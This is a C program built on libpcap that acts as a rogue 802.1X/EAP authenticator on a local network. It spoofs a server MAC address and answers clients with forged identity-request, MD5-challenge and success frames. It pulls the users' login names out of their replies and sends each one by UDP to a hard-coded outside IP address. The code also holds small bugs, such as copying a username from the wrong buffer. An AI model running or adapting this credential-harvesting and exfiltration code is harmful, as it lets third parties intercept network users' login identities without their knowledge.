#include<sys/socket.h>
#include<pcap.h>
#include<stdlib.h>
#include<stdio.h>
#include <netinet/in.h>
#include<unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <string.h>
#include <arpa/inet.h>
#include<sys/types.h>

#define LISTENING 0
#define STARTGOT 1
#define REQ1SENT 2
#define USERGOT  3
#define MD5CHALLENGESENT 4
#define MD5GOT 5

#define ETHERTYPE 0x8880

u_char ServerMac[6] = {0x00,0xea,0x01,0x28,0x28,0xeb};

int macConvert(char *macstr, u_char *mac)
{
    char *pstr = macstr;
    u_char *pmac = mac;
    unsigned int state = 0;

    while (*pstr != '\0') {
        if (*pstr >= '0' && *pstr <= '9') {
            if (state == 0) { /* first */
                *pmac = (u_char)((*pstr) - '0');
            } else {
                *pmac = ((u_char)((*pstr) - '0')) + (*pmac)*16;
                printf("%x ", *pmac);
                pmac++;
            }
            state = 1 - state;

        } else if (*pstr >= 'a' && *pstr <= 'f') {
            if (state == 0) { /* first */
                *pmac = (u_char)((*pstr) - 'a' + 0x0a);
            } else {
                *pmac = ((u_char)((*pstr) - 'a' + 0x0a)) + (*pmac)*16;
                printf("%x ", *pmac);
                pmac++;
            }
            state = 1 - state;
        } 
        pstr++;
    }

    return 0;
}

void printmac(u_char *mac)
{
    int i;

    for(i = 0; i < 6; i++) {
        printf("%02x:",mac[i]);
    }
    printf("\n");
}

void GetAddr()
{
    struct ifreq ifr;
    int sock;
    char nic[16] = "";

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if(sock < 0) {
        fprintf(stderr, "sock create error\n");
        exit(1);
    }

    strcpy(ifr.ifr_name, nic);
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        fprintf(stderr, "ioctl create error\n");
        exit(1);
    }
    memcpy(ServerMac, ifr.ifr_hwaddr.sa_data, 6);
    printmac(ServerMac);


}

int mksocket()
{
    int sockfd;

    struct sockaddr_in address;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = inet_addr("59.77.33.124");
    address.sin_port = htons(60001);

    if((connect(sockfd, (struct sockaddr *)&address, sizeof(address))) < 0) {
        perror("");
        exit(1);
    }

    return sockfd;
}

pcap_t *opev_devices(void)
{
        pcap_if_t *alldevs;
        pcap_if_t *d;
        pcap_t *adhandle;
        int i=0;
        char errbuf[PCAP_ERRBUF_SIZE];
        int inum;
                        
        /* Retrieve the device list from the local machine */
        if (pcap_findalldevs(&alldevs, errbuf) == -1) {
            fprintf(stderr,"Error in pcap_findalldevs_ex: %s\n", errbuf);
            exit(1);
        }
                            
        /* Print the list */
        for(d= alldevs; d != NULL; d= d->next) {
            printf("%d. %s", ++i, d->name);
            if (d->description)
                printf(" (%s)\n", d->description);
            else
                printf(" (No description available)\n");
        }
                                
        if (i == 0) {
            printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
            exit(1);
        }

        printf("Enter the interface number 1-%d : ", i);
        scanf("%d", &inum);

        if(inum < 1 || inum > i) {
            printf("interface number out of range\n");
            pcap_freealldevs(alldevs);
            exit(1);
        }

        for(d = alldevs, i = 0; i < inum-1; i++)
            d = d->next;

        /* open device */
        if((adhandle = pcap_open_live(d->name, 65536, 1, 10000, errbuf)) == NULL) {
            fprintf(stderr, "Error opening device\n");
            pcap_freealldevs(alldevs);
            exit(1);
        }


        return adhandle;

}

void SetFilter(pcap_t *handler)
{
    char buf[PCAP_ERRBUF_SIZE] = "ether proto 0x888e";
    struct bpf_program fcode;


    if(pcap_compile(handler, &fcode, buf, 0, 0xFFFFFFFF) < 0) {
        fprintf(stderr, "compile code error\n");
        exit(1);
    }

    if(pcap_setfilter(handler, &fcode) < 0) {
        fprintf(stderr, "set filter error\n");
        exit(1);
    }

}

void make_idreq(u_char *dstmac, u_char *srcmac, u_char *packet)
{
    u_char p[] = {
        0x00,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x00,0x00,0x00,
        0x88,0x8e,                                  // type: 802.X Authentication
        0x01,                                       // version
        0x00,                                       // type: EAP packet
        0x00,0x05,                                  // length
        0x01,                                       // request
        0x01,                                       // id
        0x00,0x05,                                  // length
        0x01,                                       // type: identity
    };

    memcpy(p, dstmac, 6);
    memcpy(p+6, srcmac, 6);
    memcpy(packet, p, sizeof(p));
}

void make_md5req(u_char *dstmac, u_char *srcmac, u_char *packet)
{
    u_char p[] = {
        0x00,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x00,0x00,0x00,
        0x88,0x8e,                                  // type: 802.X Authentication
        0x01,                                       // version
        0x00,                                       // type: EAP packet
        0x00,0x1d,                                  // length
        0x01,                                       // request
        0x02,                                       // id
        0x00,0x1d,                                  // length
        0x04,                                       // type: md5 challenge
        0x10,                                       // value size
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,    // md5 value 
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0x13,0x11,0x2e,0x03,0x01,0x00,
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    };

    memcpy(p, dstmac, 6);
    memcpy(p+6, srcmac, 6);
    memcpy(packet, p, sizeof(p));
    
}

void make_success(u_char *dstmac, u_char *srcmac, u_char *packet)
{
    u_char p[] = {
        0x00,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x00,0x00,0x00,
        0x88,0x8e,                                  // 12,13: type: 802.X Authentication
        0x01,                                       // 14: version
        0x00,                                       // 15: type: EAP packet
        0x00,0x18,                                  // 16,17: length
        0x03,                                       // request
        0x02,                                       // id
        0x00,0x04,                                  // length
        0x00,0x00,
        0x13,0x11,0x00,0x27,
        0x48,0x45,0x4c,0x4c,0x4f,0x20,
        0x00,0x27,0x13,0x11,

    };

    memcpy(p, dstmac, 6);
    memcpy(p+6, srcmac, 6);
    memcpy(packet, p, sizeof(p));
    
}

void getusername(const u_char *packet, u_char *username)
{
    memcpy(username, packet+0x17, 19);
}

void print2mac(const u_char *packet)
{
    int i;

    for(i = 0; i < 5; i++) {
        fprintf(stderr,"%02x:",packet[i]);
    }
    fprintf(stderr,"%02x   ", packet[i]);

    for(i++; i < 11; i++) {
        fprintf(stderr,"%02x:",packet[i]);
    }
    fprintf(stderr,"%02x\n",packet[i]);
}




void main_loop(pcap_t *handler)
{
    int res;
    struct pcap_pkthdr *header;
    const u_char *pkt_data;
    int state;
    u_char packet[0x40];
    u_char clientmac[6];
    //int sockfd = mksocket();
    u_char username[20];

    int sockfd;

    struct sockaddr_in address;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = inet_addr("59.77.33.124");
    address.sin_port = htons(65001);

    username[19] = '\0';

    state = LISTENING;

    while(1) {
        if(state == LISTENING) {
            fprintf(stderr,"Listening...\n");
            if((res = pcap_next_ex(handler, &header, &pkt_data)) > 0) {
                if(pkt_data[0x0f] == 0x01) {
                    fprintf(stderr,"Start packet got\n");
                    memcpy(clientmac, pkt_data + 6, 6);
                } else {
                    if(pkt_data[0x0f] == 0xbf) {
                        fprintf(stderr, ".");
                    } else if(pkt_data[0x0f] == 0xc0 && pkt_data[0x27] == 0x53) {
                        memcpy(username, packet+0x27, 19);
                        fprintf(stdout,"%s\n",username);
                        username[19] = '\n';
                        sendto(sockfd, username, sizeof(username), 0, (struct sockaddr *)&address, sizeof(address));
                    } else {
                        fprintf(stderr, "Not a start packet, ignore\n");
                    }
                    print2mac(pkt_data);
                    continue;
                }
            } else {
                if(res == 0) { /* time out */
                    fprintf(stderr,"time out\n");
                    continue;
                } else {
                    fprintf(stderr, "packet receive error\n");
                }
            }
        } else if(state == STARTGOT) {
            memset(packet,0,sizeof(packet));
            make_idreq(clientmac, ServerMac, packet);
            if (pcap_sendpacket(handler, packet, sizeof(packet) /* size */) != 0) {
                fprintf(stderr, "Error sending idreq\n");
                continue;
            }
        } else if(state == REQ1SENT) {
            if((res = pcap_next_ex(handler, &header, &pkt_data)) > 0) {
                if(memcmp(pkt_data+6 ,clientmac,sizeof(clientmac)) != 0) {
                    fprintf(stderr, "Not this client\n");
                    continue;
                }
                if(pkt_data[0x12] == 0x02 && pkt_data[0x16] == 0x01) {
                    fprintf(stderr, "id confirmed\n");
                    getusername( pkt_data,username);
                    fprintf(stdout,"%s\n",username);
                    username[19] = '\n';
                    sendto(sockfd, username, sizeof(username), 0, (struct sockaddr *)&address, sizeof(address));
                } else {
                    fprintf(stderr, "not id confirm\n");
                    continue;
                }
            } else {
                if(res == 0) { /* time out */
                    fprintf(stderr,"time out\n");
                    state = 0;
                    continue;
                } else {
                    fprintf(stderr, "packet receive error\n");
                }
            }
        } else if(state == USERGOT) {
            memset(packet,0,sizeof(packet));
            make_md5req(clientmac, ServerMac, packet);
            if (pcap_sendpacket(handler, packet, sizeof(packet) /* size */) != 0) {
                fprintf(stderr, "Error sending md5req\n");
                continue;
            }
        } else if(state == MD5CHALLENGESENT) {
            if((res = pcap_next_ex(handler, &header, &pkt_data)) > 0) {
                if(memcmp(pkt_data+6 ,clientmac,sizeof(clientmac)) != 0) {
                    fprintf(stderr, "Not this client\n");
                    continue;
                }
                if(pkt_data[0x12] == 0x02 && pkt_data[0x16] == 0x04) {
                    fprintf(stderr, "md5 confirmed\n");
                } else {
                    continue;
                }
            } else {
                if(res == 0) { /* time out */
                    fprintf(stderr,"time out\n");
                    state = 0;
                    continue;
                } else {
                    fprintf(stderr, "packet receive error\n");
                }
            }
        } else if(state == MD5GOT) {
            memset(packet,0,sizeof(packet));
            make_success(clientmac, ServerMac, packet);
            if (pcap_sendpacket(handler, packet, sizeof(packet) /* size */) != 0) {
                fprintf(stderr, "Error sending success\n");
                continue;
            }
            fprintf(stderr, "Success\n");
        }
        state = (state + 1) % 6;

    }

}





int main(int argc, char *argv[])
{
    macConvert(argv[1], ServerMac);
    pcap_t* handler;

    //GetAddr();

    handler = opev_devices();
    SetFilter(handler);
    main_loop(handler);

    
    

    return 0;
}
